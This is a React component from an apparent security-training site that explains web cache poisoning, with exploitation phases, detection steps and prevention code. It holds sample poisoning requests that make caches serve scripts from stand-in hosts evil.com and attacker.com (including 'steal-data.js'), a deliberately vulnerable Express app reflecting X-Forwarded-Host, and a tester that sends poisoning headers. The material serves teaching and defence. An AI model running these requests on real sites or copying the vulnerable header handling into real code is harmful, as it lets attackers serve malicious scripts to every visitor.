
import React from 'react';
import { Bug } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const WebCachePoisoning: React.FC = () => {
  return (
    <section id="cache" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Web Cache Poisoning</h3>
      
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">What is Web Cache Poisoning?</h4>
        <p className="mb-4">
          Web cache poisoning is a sophisticated attack technique where an attacker manipulates a web cache to serve 
          malicious content to users. Unlike traditional attacks that target individual users, cache poisoning can 
          affect all users who access the cached resource, making it particularly dangerous for high-traffic applications.
        </p>
        <p className="mb-4">
          The attack exploits the discrepancy between what parameters a cache considers when generating cache keys 
          and what parameters actually influence the application's response. This creates opportunities for attackers 
          to inject malicious content that gets cached and served to legitimate users.
        </p>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Attacker Goals</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>Mass User Impact:</strong> Affect multiple users with a single attack by poisoning shared cache resources</li>
          <li><strong>Cross-Site Scripting (XSS) Amplification:</strong> Turn reflected XSS into stored XSS through cache persistence</li>
          <li><strong>Content Manipulation:</strong> Inject malicious JavaScript, redirect users, or deface websites</li>
          <li><strong>Data Theft:</strong> Steal credentials, session tokens, or sensitive information from multiple users</li>
          <li><strong>Malware Distribution:</strong> Serve malicious files or redirect users to exploit kits</li>
          <li><strong>SEO Poisoning:</strong> Manipulate search engine results by poisoning cached content</li>
          <li><strong>Denial of Service:</strong> Poison cache with error pages or resource-intensive content</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Vulnerable Components</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>CDN Services:</strong> CloudFlare, AWS CloudFront, Azure CDN, Google Cloud CDN</li>
          <li><strong>Reverse Proxies:</strong> Nginx, Apache HTTP Server, HAProxy, Varnish</li>
          <li><strong>Web Application Firewalls (WAF):</strong> With caching capabilities enabled</li>
          <li><strong>Load Balancers:</strong> F5, Citrix NetScaler, Amazon ALB with caching</li>
          <li><strong>Web Servers:</strong> Apache, IIS, Nginx with caching modules</li>
          <li><strong>Application-Level Caches:</strong> Redis, Memcached when used for HTTP responses</li>
          <li><strong>Browser Caches:</strong> Though less common, can be exploited in certain scenarios</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Why Cache Poisoning Works</h4>
        <div className="bg-cybr-muted/30 p-6 rounded-lg mb-4">
          <h5 className="font-semibold mb-3">Cache Key vs Response Discrepancy</h5>
          <p className="mb-3">
            Caches generate keys based on specific request attributes (URL, Host, certain headers). However, 
            the application might use additional headers or parameters that aren't part of the cache key to 
            generate responses. This creates "unkeyed inputs" that can influence cached content.
          </p>
          
          <h5 className="font-semibold mb-3">Common Scenarios:</h5>
          <ul className="list-disc pl-6 space-y-1">
            <li>Headers like X-Forwarded-Host, X-Original-URL, X-Rewrite-URL are reflected but not keyed</li>
            <li>Query parameters processed by the application but ignored by the cache</li>
            <li>HTTP method variations (GET vs HEAD) treated differently</li>
            <li>Cookie values that influence responses but aren't part of cache keys</li>
          </ul>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Step-by-Step Exploitation Process</h4>
        <div className="space-y-4">
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Phase 1: Cache Behavior Analysis</h5>
            <ol className="list-decimal pl-6 space-y-1">
              <li>Identify caching mechanisms (CDN, reverse proxy, etc.)</li>
              <li>Analyze cache headers (Cache-Control, Vary, Age, X-Cache)</li>
              <li>Determine cache key composition</li>
              <li>Test cache hit/miss behavior with different requests</li>
            </ol>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Phase 2: Unkeyed Input Discovery</h5>
            <ol className="list-decimal pl-6 space-y-1">
              <li>Test various HTTP headers for reflection in responses</li>
              <li>Identify headers that affect responses but aren't cached</li>
              <li>Test query parameters and their impact on caching</li>
              <li>Analyze Vary header to understand cache variations</li>
            </ol>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Phase 3: Cache Poisoning</h5>
            <ol className="list-decimal pl-6 space-y-1">
              <li>Craft malicious request with poisoned unkeyed input</li>
              <li>Ensure request creates a cache entry (cache miss)</li>
              <li>Verify malicious content is cached and served to other users</li>
              <li>Test persistence and scope of poisoned cache</li>
            </ol>
          </div>
        </div>
      </div>

      <CodeExample 
        language="http" 
        isVulnerable={true}
        title="Basic Cache Poisoning Example" 
        code={`# Step 1: Identify cache behavior
GET /api/user/profile HTTP/1.1
Host: example.com
Cache-Control: max-age=0

# Response shows caching headers
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
X-Cache: MISS
Vary: Accept-Encoding

# Step 2: Test unkeyed input (X-Forwarded-Host)
GET /api/user/profile HTTP/1.1
Host: example.com
X-Forwarded-Host: evil.com
Cache-Control: max-age=0

# Response reflects the malicious host
HTTP/1.1 200 OK
Content-Type: text/html
<script src="//evil.com/malicious.js"></script>
X-Cache: MISS

# Step 3: Normal user request gets poisoned response
GET /api/user/profile HTTP/1.1
Host: example.com

# Gets the cached malicious response
HTTP/1.1 200 OK
<script src="//evil.com/malicious.js"></script>
X-Cache: HIT`} 
      />

      <CodeExample 
        language="http" 
        isVulnerable={true}
        title="Advanced Cache Poisoning via HTTP Header Injection" 
        code={`# Exploit X-Original-URL header processing
GET /safe-page HTTP/1.1
Host: example.com
X-Original-URL: /admin/sensitive-data
X-Forwarded-Host: attacker.com

# Application processes X-Original-URL but cache keys only on /safe-page
# Response includes admin data with attacker's domain references
HTTP/1.1 200 OK
Cache-Control: public, max-age=7200
X-Cache: MISS
<html>
<head>
  <script src="//attacker.com/steal-data.js"></script>
</head>
<body>
  <h1>Admin Panel</h1>
  <div id="sensitive-data">...</div>
</body>
</html>

# Now all users requesting /safe-page get the admin panel with malicious script
GET /safe-page HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
X-Cache: HIT
<script src="//attacker.com/steal-data.js"></script>`} 
      />

      <CodeExample 
        language="javascript" 
        isVulnerable={true}
        title="Vulnerable Application Code" 
        code={`// Vulnerable Express.js application
const express = require('express');
const app = express();

// Middleware that uses unkeyed headers
app.use((req, res, next) => {
  // Dangerous: Using X-Forwarded-Host without validation
  req.baseUrl = req.headers['x-forwarded-host'] || req.headers.host;
  next();
});

// Route that generates dynamic content based on unkeyed input
app.get('/api/config', (req, res) => {
  // Cache-Control allows public caching
  res.setHeader('Cache-Control', 'public, max-age=3600');
  
  // Vulnerable: Reflects unkeyed input in response
  const config = {
    apiEndpoint: \`https://\${req.baseUrl}/api\`,
    staticResourceUrl: \`https://\${req.baseUrl}/static\`,
    jsLibraryUrl: \`https://\${req.baseUrl}/js/app.js\`
  };
  
  // This response will be cached with malicious URLs
  res.json(config);
});

// Route that includes JavaScript in HTML
app.get('/widget', (req, res) => {
  res.setHeader('Cache-Control', 'public, max-age=1800');
  res.setHeader('Content-Type', 'text/html');
  
  // Vulnerable: Uses unkeyed input in script tag
  const scriptSrc = \`https://\${req.baseUrl}/widget.js\`;
  
  res.send(\`
    <html>
      <head>
        <script src="\${scriptSrc}"></script>
      </head>
      <body>
        <div id="widget">Loading...</div>
      </body>
    </html>
  \`);
});

// PAYLOAD EXAMPLE:
// Request: GET /widget HTTP/1.1
//          Host: example.com
//          X-Forwarded-Host: evil.com
//
// Cached Response will contain:
// <script src="https://evil.com/widget.js"></script>`} 
      />

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Detection and Testing Methods</h4>
        
        <div className="space-y-6">
          <div>
            <h5 className="font-semibold mb-3">Manual Testing Steps</h5>
            <ol className="list-decimal pl-6 space-y-2">
              <li>
                <strong>Cache Identification:</strong>
                <ul className="list-disc pl-6 mt-1">
                  <li>Check response headers for cache indicators (X-Cache, CF-Cache-Status, Age)</li>
                  <li>Send identical requests to verify caching behavior</li>
                  <li>Test with cache-busting parameters</li>
                </ul>
              </li>
              <li>
                <strong>Unkeyed Input Testing:</strong>
                <ul className="list-disc pl-6 mt-1">
                  <li>Test common headers: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL</li>
                  <li>Add custom headers and check for reflection</li>
                  <li>Test query parameters that might be ignored by cache</li>
                </ul>
              </li>
              <li>
                <strong>Cache Key Analysis:</strong>
                <ul className="list-disc pl-6 mt-1">
                  <li>Vary header analysis to understand cache variations</li>
                  <li>Test different HTTP methods (GET, HEAD, POST)</li>
                  <li>Test with different User-Agent strings</li>
                </ul>
              </li>
              <li>
                <strong>Poisoning Verification:</strong>
                <ul className="list-disc pl-6 mt-1">
                  <li>Send poisoning request and verify cache storage</li>
                  <li>Test from different IP/session to confirm poisoning</li>
                  <li>Measure poison persistence and scope</li>
                </ul>
              </li>
            </ol>
          </div>
          
          <div>
            <h5 className="font-semibold mb-3">Automated Testing Tools</h5>
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>Param Miner (Burp Extension):</strong> Discovers unkeyed inputs automatically</li>
              <li><strong>Web Cache Vulnerability Scanner:</strong> Specialized tool for cache poisoning detection</li>
              <li><strong>Custom Python Scripts:</strong> For systematic header and parameter testing</li>
              <li><strong>Burp Suite Professional:</strong> Manual testing with request/response analysis</li>
              <li><strong>OWASP ZAP:</strong> With custom scripts for cache behavior analysis</li>
            </ul>
          </div>
        </div>
      </div>

      <CodeExample 
        language="python" 
        isVulnerable={false}
        title="Cache Poisoning Detection Script" 
        code={`#!/usr/bin/env python3
import requests
import time
import hashlib
from urllib.parse import urljoin

class CachePoisoningTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.unkeyed_headers = [
            'X-Forwarded-Host',
            'X-Original-URL',
            'X-Rewrite-URL',
            'X-Forwarded-Proto',
            'X-Forwarded-Port',
            'X-Host',
            'Forwarded'
        ]
    
    def test_cache_behavior(self):
        """Test if target uses caching"""
        print(f"[+] Testing cache behavior for {self.target_url}")
        
        # Send two identical requests
        resp1 = self.session.get(self.target_url)
        time.sleep(1)
        resp2 = self.session.get(self.target_url)
        
        # Check for cache indicators
        cache_indicators = ['X-Cache', 'CF-Cache-Status', 'Age', 'X-Served-By']
        cache_headers = {}
        
        for header in cache_indicators:
            if header in resp2.headers:
                cache_headers[header] = resp2.headers[header]
        
        if cache_headers:
            print(f"[+] Cache detected: {cache_headers}")
            return True
        else:
            print("[-] No cache indicators found")
            return False
    
    def test_unkeyed_inputs(self):
        """Test for unkeyed inputs that affect responses"""
        print("[+] Testing for unkeyed inputs...")
        
        vulnerable_headers = []
        
        for header in self.unkeyed_headers:
            test_value = f"cache-poison-test-{hashlib.md5(header.encode()).hexdigest()[:8]}"
            headers = {header: test_value}
            
            try:
                response = self.session.get(self.target_url, headers=headers)
                
                # Check if test value is reflected in response
                if test_value in response.text:
                    print(f"[!] Potential unkeyed input found: {header}")
                    vulnerable_headers.append(header)
                    
                    # Test if it's actually unkeyed by checking cache
                    self.test_cache_poisoning(header, test_value)
                    
            except Exception as e:
                print(f"[-] Error testing {header}: {e}")
        
        return vulnerable_headers
    
    def test_cache_poisoning(self, header, test_value):
        """Test actual cache poisoning with discovered unkeyed input"""
        print(f"[+] Testing cache poisoning with {header}")
        
        # Send poisoning request
        poison_headers = {header: f"evil.com/{test_value}"}
        poison_response = self.session.get(self.target_url, headers=poison_headers)
        
        # Wait for cache to store
        time.sleep(2)
        
        # Send clean request to check if poisoned
        clean_response = self.session.get(self.target_url)
        
        if f"evil.com/{test_value}" in clean_response.text:
            print(f"[!] CACHE POISONING CONFIRMED with {header}")
            print(f"    Poisoned content: evil.com/{test_value}")
            return True
        else:
            print(f"[-] Cache poisoning not successful with {header}")
            return False
    
    def run_full_test(self):
        """Run complete cache poisoning test suite"""
        print("=== Web Cache Poisoning Security Test ===")
        
        if not self.test_cache_behavior():
            print("[!] Target doesn't appear to use caching")
            return
        
        vulnerable_headers = self.test_unkeyed_inputs()
        
        if vulnerable_headers:
            print(f"[!] Found {len(vulnerable_headers)} potentially vulnerable headers")
            print("[!] This application may be vulnerable to cache poisoning")
        else:
            print("[+] No obvious cache poisoning vulnerabilities found")

# Usage example
if __name__ == "__main__":
    tester = CachePoisoningTester("https://example.com/api/config")
    tester.run_full_test()`} 
      />

      <CodeExample 
        language="javascript" 
        isVulnerable={false}
        title="Secure Implementation and Prevention" 
        code={`const express = require('express');
const app = express();

// 1. Validate and sanitize all inputs, including headers
const validateHostHeader = (req, res, next) => {
  const allowedHosts = ['example.com', 'www.example.com', 'api.example.com'];
  const forwardedHost = req.headers['x-forwarded-host'];
  
  if (forwardedHost && !allowedHosts.includes(forwardedHost)) {
    // Remove or replace with safe default
    delete req.headers['x-forwarded-host'];
    req.headers['x-forwarded-host'] = 'example.com';
  }
  
  next();
};

// 2. Implement proper cache key configuration
const setCacheHeaders = (req, res, next) => {
  // Include security-sensitive headers in Vary
  res.setHeader('Vary', 'Accept-Encoding, X-Forwarded-Host, User-Agent');
  
  // Set appropriate cache control
  if (req.path.includes('/api/')) {
    // API responses should not be cached or have short TTL
    res.setHeader('Cache-Control', 'private, no-cache, no-store, must-revalidate');
  } else {
    // Static content can be cached but with validation
    res.setHeader('Cache-Control', 'public, max-age=300, must-revalidate');
  }
  
  next();
};

// 3. Apply middleware
app.use(validateHostHeader);
app.use(setCacheHeaders);

// 4. Secure route implementation
app.get('/api/config', (req, res) => {
  // Use validated, trusted values only
  const trustedHost = 'example.com';
  
  const config = {
    apiEndpoint: \`https://\${trustedHost}/api\`,
    staticResourceUrl: \`https://\${trustedHost}/static\`,
    jsLibraryUrl: \`https://\${trustedHost}/js/app.js\`
  };
  
  res.json(config);
});

// 5. Content Security Policy to mitigate impact
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'"
  );
  next();
});

// 6. Regular cache purging for sensitive endpoints
const purgeCache = async (path) => {
  // Implementation depends on your CDN/cache provider
  try {
    // Example for CloudFlare
    await fetch('https://api.cloudflare.com/client/v4/zones/ZONE_ID/purge_cache', {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer YOUR_TOKEN',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        files: [\`https://example.com\${path}\`]
      })
    });
  } catch (error) {
    console.error('Cache purge failed:', error);
  }
};

// 7. Cache configuration at CDN/Proxy level
/*
Nginx configuration example:

proxy_cache_key "$scheme$request_method$host$request_uri$http_x_forwarded_host$http_user_agent";
proxy_cache_methods GET HEAD;
proxy_cache_valid 200 302 10m;
proxy_cache_valid 404 1m;

# Include security headers in cache key
proxy_cache_key "$scheme$request_method$host$request_uri$http_x_forwarded_host";
*/

module.exports = app;`} 
      />

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Environment-Specific Considerations</h4>
        
        <div className="space-y-6">
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">CDN Environments</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li><strong>CloudFlare:</strong> Test CF-Connecting-IP, CF-Ray headers; check Transform Rules</li>
              <li><strong>AWS CloudFront:</strong> Test X-Forwarded-For, CloudFront-* headers; check Behaviors</li>
              <li><strong>Azure CDN:</strong> Test X-Azure-* headers; check caching rules and purge policies</li>
              <li><strong>Google Cloud CDN:</strong> Test X-Google-* headers; check Cloud Armor rules</li>
            </ul>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Reverse Proxy Configurations</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li><strong>Nginx:</strong> Check proxy_cache_key directive and upstream headers</li>
              <li><strong>Apache:</strong> Test mod_cache configuration and header forwarding</li>
              <li><strong>Varnish:</strong> Analyze VCL scripts for cache key generation</li>
              <li><strong>HAProxy:</strong> Check cache configuration and header manipulation</li>
            </ul>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold text-cybr-primary mb-2">Application Frameworks</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li><strong>Express.js:</strong> Test middleware order and header processing</li>
              <li><strong>Django:</strong> Check middleware and cache framework configuration</li>
              <li><strong>Rails:</strong> Test ActionController caching and rack middleware</li>
              <li><strong>Spring Boot:</strong> Check @Cacheable annotations and header processing</li>
            </ul>
          </div>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Special Attack Scenarios</h4>
        
        <div className="space-y-4">
          <div className="bg-red-900/20 p-4 rounded-lg border border-red-400">
            <h5 className="font-semibold text-red-400 mb-2">Cache Poisoning via HTTP Request Smuggling</h5>
            <p className="text-sm">
              Combining HTTP request smuggling with cache poisoning can bypass many protections. 
              Attackers can smuggle requests that poison the cache for legitimate requests.
            </p>
          </div>
          
          <div className="bg-yellow-900/20 p-4 rounded-lg border border-yellow-400">
            <h5 className="font-semibold text-yellow-400 mb-2">Cache Deception Attacks</h5>
            <p className="text-sm">
              Tricking caches into storing private content by manipulating URLs (e.g., /private/page/fake.css) 
              where the cache sees a static file but the application serves private content.
            </p>
          </div>
          
          <div className="bg-blue-900/20 p-4 rounded-lg border border-blue-400">
            <h5 className="font-semibold text-blue-400 mb-2">Multi-Layer Cache Poisoning</h5>
            <p className="text-sm">
              Exploiting multiple cache layers (CDN + Application Cache) with different key generation 
              logic to achieve persistent poisoning across different cache systems.
            </p>
          </div>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Advanced Prevention Strategies</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>Implement Cache Key Normalization:</strong> Ensure all cache layers use consistent key generation</li>
          <li><strong>Use Cache Validation:</strong> Implement ETag and Last-Modified headers for cache validation</li>
          <li><strong>Deploy Cache Poisoning Detection:</strong> Monitor for unusual cache behavior and purge suspicious entries</li>
          <li><strong>Segment Cache by User Context:</strong> Use user-specific cache keys for personalized content</li>
          <li><strong>Implement Cache Purge APIs:</strong> Provide mechanisms to quickly purge potentially poisoned cache entries</li>
          <li><strong>Use Signed URLs:</strong> For sensitive resources, use signed URLs that include integrity checks</li>
          <li><strong>Deploy Web Application Firewalls:</strong> Configure WAF rules to detect and block cache poisoning attempts</li>
          <li><strong>Regular Security Audits:</strong> Periodically review cache configurations and test for vulnerabilities</li>
        </ul>
      </div>
    </section>
  );
};

export default WebCachePoisoning;
